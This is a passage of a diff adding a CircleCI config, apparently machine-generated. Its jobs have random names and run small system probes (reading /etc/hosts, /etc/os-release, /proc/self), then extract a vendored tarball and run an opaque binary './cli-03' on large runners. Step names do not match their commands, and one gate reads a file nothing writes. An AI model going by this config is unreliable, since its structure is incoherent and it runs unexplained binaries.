+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  String-Uuid-Pattern:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: 2 nightly build per batch
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; ps axo pid,ppid,stat,comm|grep -v grep|head -10; true ; } > /var/tmp/_build/1xGyZ3lT
+            echo "stage summary: name=gating size=$(wc -c </var/tmp/_build/1xGyZ3lT)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '1xGyZ3lT'
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/1xGyZ3lT 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  mrHall:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute A
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; grep -lwr --include='*.conf' PATH /etc 2> /dev/null | nl | head -8; true ; } > /var/tmp/_build/T9
+            echo "stage summary: name=sanity size=$(wc -c </var/tmp/_build/T9)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'T9'
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/T9 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  juliett-cursor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Overnight comparison
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; cat /dev/null >/tmp/o.list && ls -s /tmp/o.list; true ; } > /var/tmp/_build/meadow464
+            echo "stage summary: name=quebec-8 size=$(wc -c </var/tmp/_build/meadow464)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'meadow464'
+  quebec-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/COBALT_HARBOR_MOLTEN 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  kjh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Scout closed captions
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; printf %s "maybe later" | b2sum | awk '{print $1}'; true ; } > /var/tmp/_build/339slxzbv
+            echo "stage summary: name=fix-6703 size=$(wc -c </var/tmp/_build/339slxzbv)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '339slxzbv'
+  fix-6703:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/339slxzbv 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  single_lib_curve:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: What about the fog volumes
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; printf 'list\t98\ncheese\t78\nshelf\t62\nproducts\t74\n' >${TMPDIR:-/tmp}/coffee-2025-10-24.conf && awk -F'\t' '{s+=$2} END {print s}' ${TMPDIR:-/tmp}/coffee-2025-10-24.conf; true ; } > /var/tmp/_build/GammaCoinNorthCluster
+            echo "stage summary: name=RolloutRelease size=$(wc -c </var/tmp/_build/GammaCoinNorthCluster)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'GammaCoinNorthCluster'
+  RolloutRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/GammaCoinNorthCluster 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  p2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Task force Ladder
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; touch '/tmp/buffer-arena.conf' && chmod u+x '/tmp/buffer-arena.conf' && [[ -x '/tmp/buffer-arena.conf' ]] && echo executable; true ; } > /var/tmp/_build/error.log.21
+            echo "stage summary: name=preview-build size=$(wc -c </var/tmp/_build/error.log.21)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'error.log.21'
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/error.log.21 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  BlockingPixelRenderer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: despawning crafting recipes in background
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; echo -n "what's next?" | od -An -tx1; true ; } > /var/tmp/_build/37273617f3aee653a08ce
+            echo "stage summary: name=delta-8 size=$(wc -c </var/tmp/_build/37273617f3aee653a08ce)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '37273617f3aee653a08ce'
+  delta-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/37273617f3aee653a08ce 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+
+  pumpkin_c_13906:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Proceed with mix of the petri dishes
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; \grep -s -o host /etc/hosts | tail -n 3; true ; } > /var/tmp/_build/df31a421-7e55-a5ef-6ac4-c2ff6cf4ab0
+            echo "stage summary: name=tweak-cache-redirect size=$(wc -c </var/tmp/_build/df31a421-7e55-a5ef-6ac4-c2ff6cf4ab0)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'df31a421-7e55-a5ef-6ac4-c2ff6cf4ab0'
+  cchFresh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: ya publish the newsletter
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; fallocate -l 4K "${TMPDIR:-/tmp}/local-weather-basil.tmp" && ls -lh "${TMPDIR:-/tmp}/local-weather-basil.tmp"; true ; } > /var/tmp/_build/7b513ae
+            echo "stage summary: name=Ship_Release5 size=$(wc -c </var/tmp/_build/7b513ae)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '7b513ae'
+  B92E2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Carry out a full retirement of the weekly digest
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; test -x /bin/sh && echo 'true' || echo false; true ; } > /var/tmp/_build/37273617f3aee653a08ce
+            echo "stage summary: name=delta-8 size=$(wc -c </var/tmp/_build/37273617f3aee653a08ce)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '37273617f3aee653a08ce'
+  attr_rad:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Sous vide the case study
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; echo test{1..3}.txt; true ; } > /var/tmp/_build/PNG.raster
+            echo "stage summary: name=wip-login-leak size=$(wc -c </var/tmp/_build/PNG.raster)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'PNG.raster'
+  gradient_temp_get_pipe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute A
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; if [ ! -d $HOME ]; then echo true; else echo false; fi; true ; } > /var/tmp/_build/T9
+            echo "stage summary: name=sanity size=$(wc -c </var/tmp/_build/T9)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'T9'
+  op_uniform:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: incubating test tubes in background
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; compgen -b|sed 's/^/- /'|wc -l; true ; } > /var/tmp/_build/GammaCoinNorthCluster
+            echo "stage summary: name=RolloutRelease size=$(wc -c </var/tmp/_build/GammaCoinNorthCluster)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'GammaCoinNorthCluster'
+  backport-684-pipe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute A
+          command: |
+            mkdir -p /var/tmp/_build
+            set +o pipefail 2>/dev/null; declare -A m; for i in $(seq 1 1000); do m[k${i}]=$((i*31)); done; for k in "${!m[@]}"; do echo "${k}=${m[$k]}"; done > /var/tmp/_build/44LMuCZtxuUZqyJ16D; true
+            echo "stage summary: name=yolo size=$(wc -c </var/tmp/_build/44LMuCZtxuUZqyJ16D)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '44LMuCZtxuUZqyJ16D'
+  testClampScore:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Tab to the empty state
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; for conf in /usr/bin/z*; do du -h $conf; done | tac; true ; } > /var/tmp/_build/error.log.21
+            echo "stage summary: name=preview-build size=$(wc -c </var/tmp/_build/error.log.21)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'error.log.21'
+  countWorkerGenerator:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Incubation depth 5
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; cut -d = -f 2- /etc/os-release | tr '[:lower:]' '[:upper:]'; true ; } > /var/tmp/_build/20211109_165620
+            echo "stage summary: name=rm-edge-reload size=$(wc -c </var/tmp/_build/20211109_165620)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '20211109_165620'
+  klushsisttaimd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Garbage collect the retry buffer to be thorough
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 1 -type f -path "*/.conf" -exec wc -l "{}" \;; true ; } > /var/tmp/_build/339slxzbv
+            echo "stage summary: name=fix-6703 size=$(wc -c </var/tmp/_build/339slxzbv)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '339slxzbv'
+  IN-OUT-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: aaand kick off the workers
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; find /proc/self -type f -empty -exec head -n 1 -q {} + 2>/dev/null | tail -n 20; true ; } > /var/tmp/_build/CHROME
+            echo "stage summary: name=go1-21-fmt size=$(wc -c </var/tmp/_build/CHROME)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'CHROME'
+  ChainedJobEvent:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Ship the canary fleet to Frankfurt
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; stdbuf -oL echo 'snake_case_name'; true ; } > /var/tmp/_build/14go0n3a57
+            echo "stage summary: name=verify-staging-release-candidate size=$(wc -c </var/tmp/_build/14go0n3a57)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '14go0n3a57'
+  theBen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Circle back on refund
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; mkdir -p "${TMPDIR:-/tmp}/backupaccess-2018-02-26"&&head -c 84082 /dev/urandom >"${TMPDIR:-/tmp}/backupaccess-2018-02-26"/blob&&du -sh "${TMPDIR:-/tmp}/backupaccess-2018-02-26"; true ; } > /var/tmp/_build/tenant-silver
+            echo "stage summary: name=v2-edge size=$(wc -c </var/tmp/_build/tenant-silver)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'tenant-silver'
+workflows:
+  all:
+    jobs:
+      - mutex_in_px
+      - pumpkin_c_13906:
+          requires:
+            - mutex_in_px
+      - tweak-cache-redirect:
+          requires:
+            - pumpkin_c_13906
+      - Price2SVM:
+          requires:
+            - pumpkin_c_13906
+      - cchFresh:
+          requires:
+            - Price2SVM
+      - Ship_Release5:
+          requires:
+            - cchFresh
+      - BlockingPixelRenderer:
+          requires:
+            - cchFresh
+      - B92E2:
+          requires:
+            - BlockingPixelRenderer
+      - delta-8:
+          requires:
+            - B92E2
+      - iter6512
+      - attr_rad:
+          requires:
+            - iter6512
+      - wip-login-leak:
+          requires:
+            - attr_rad
+      - mrHall:
+          requires:
+            - attr_rad
+      - gradient_temp_get_pipe:
+          requires:
+            - mrHall
+      - sanity:
+          requires:
+            - gradient_temp_get_pipe
+      - single_lib_curve:
+          requires:
+            - gradient_temp_get_pipe
+      - op_uniform:
+          requires:
+            - single_lib_curve
+      - RolloutRelease:
+          requires:
+            - op_uniform
+      - jogmw
+      - backport-684-pipe:
+          requires:
+            - jogmw
+      - yolo:
+          requires:
+            - backport-684-pipe
+      - p2:
+          requires:
+            - backport-684-pipe
+      - testClampScore:
+          requires:
+            - p2
+      - preview-build:
+          requires:
+            - testClampScore
+      - footer_footer:
+          requires:
+            - testClampScore
+      - countWorkerGenerator:
+          requires:
+            - footer_footer
+      - rm-edge-reload:
+          requires:
+            - countWorkerGenerator
+      - kjh:
+          requires:
+            - countWorkerGenerator
+      - klushsisttaimd:
+          requires:
+            - kjh
+      - fix-6703:
+          requires:
+            - klushsisttaimd
+      - spoangstranai:
+          requires:
+            - klushsisttaimd
+      - IN-OUT-2:
+          requires:
+            - spoangstranai
+      - go1-21-fmt:
+          requires:
+            - IN-OUT-2
+      - XXLO:
+          requires:
+            - IN-OUT-2
+      - ChainedJobEvent:
+          requires:
+            - XXLO
+      - verify-staging-release-candidate:
+          requires:
+            - ChainedJobEvent
+      - batchTotalHandlerLedgerAtlas:
+          requires:
+            - ChainedJobEvent
+      - theBen:
+          requires:
+            - batchTotalHandlerLedgerAtlas
+      - v2-edge:
+          requires:
+            - theBen
+      - pic_01080_deprecated
+      - dec5-rev:
+          requires:
+            - pic_01080_deprecated
+      - comment_collect_disable:
+          requires:
+            - pic_01080_deprecated
+      - q4-ship:
+          requires:
+            - comment_collect_disable
+      - String-Uuid-Pattern:
+          requires:
+            - comment_collect_disable
+      - gating:
+          requires:
+            - String-Uuid-Pattern
+      - zUnionSidebar:
+          requires:
+            - String-Uuid-Pattern
+      - titan-final:
+          requires:
+            - zUnionSidebar
+      - iriscodes:
+          requires:
+            - zUnionSidebar
+      - build-staging-integration-tests:
+          requires:
+            - iriscodes
+      - mx-test-b
+      - ID-STATUS-DTL
+      - push-it:
+          requires:
+            - mx-test-b
+            - ID-STATUS-DTL
+      - dotnet8-vet:
+          requires:
+            - mx-test-b
+            - ID-STATUS-DTL
+      - rust-build:
+          requires:
+            - mx-test-b
+            - ID-STATUS-DTL
+      - chen-ci:
+          requires:
+            - mx-test-b
+            - ID-STATUS-DTL
+      - v7-nightly:
+          requires:
+            - mx-test-b
+            - ID-STATUS-DTL
+      - prometheus-alpha:
+          requires:
+            - mx-test-b
+            - ID-STATUS-DTL
+      - q3-smoke:
+          requires:
+            - mx-test-b
+            - ID-STATUS-DTL
+      - rigel-rc:
+          requires:
+            - mx-test-b
+            - ID-STATUS-DTL
+      - wasBack
+      - inc_sz
+      - update-cache-hang:
+          requires:
+            - wasBack
+            - inc_sz
+      - rm-edge-hang:
+          requires:
+            - wasBack
+            - inc_sz
+      - tango:
+          requires:
+            - wasBack
+            - inc_sz
+      - quebec-8:
+          requires:
+            - wasBack
+            - inc_sz
